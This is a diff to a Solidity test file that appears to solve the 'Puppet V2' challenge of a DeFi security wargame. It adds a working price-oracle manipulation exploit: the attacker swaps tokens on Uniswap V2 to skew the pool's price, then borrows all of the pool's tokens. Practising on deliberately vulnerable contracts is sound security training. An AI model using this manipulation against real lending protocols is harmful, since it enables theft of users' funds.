@@ -100,13 +100,22 @@ contract PuppetV2 is Test {
     }
 
     function testExploit() public {
-        /**
-         * EXPLOIT START *
-         */
-
-        /**
-         * EXPLOIT END *
-         */
+        vm.startPrank(attacker);
+        dvt.approve(address(uniswapV2Router), ATTACKER_INITIAL_TOKEN_BALANCE);
+        address[] memory path = new address[](2);
+        path[0] = address(dvt);
+        path[1] = address(weth);
+        uniswapV2Router.swapExactTokensForTokens(ATTACKER_INITIAL_TOKEN_BALANCE, 1, path, attacker, DEADLINE);
+        weth.deposit{value: 20 ether}();
+        console.log("completed swap and weth change");
+        console.log("eth balance: ", attacker.balance / 1e18);
+        console.log("weth balance: ", weth.balanceOf(attacker) / 1e18);
+        console.log("dvt balance: ", dvt.balanceOf(attacker));
+        uint256 depositRequired = puppetV2Pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("WETH Deposit required: ", depositRequired / 1e18);
+        weth.approve(address(puppetV2Pool), depositRequired);
+        puppetV2Pool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+        vm.stopPrank();
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
